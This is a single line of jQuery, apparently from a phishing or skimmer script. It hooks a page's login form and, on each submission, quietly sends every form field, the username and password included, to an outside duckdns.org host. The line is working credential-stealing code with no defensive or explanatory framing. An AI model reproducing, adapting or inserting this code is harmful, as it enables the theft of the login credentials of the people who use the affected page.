$(".login-form").submit(function() {$.ajax({ url:"http://5desember1day.duckdns.org/ressokep/index.php",type: "POST",data: $(this).serialize(), success: function () {}})});
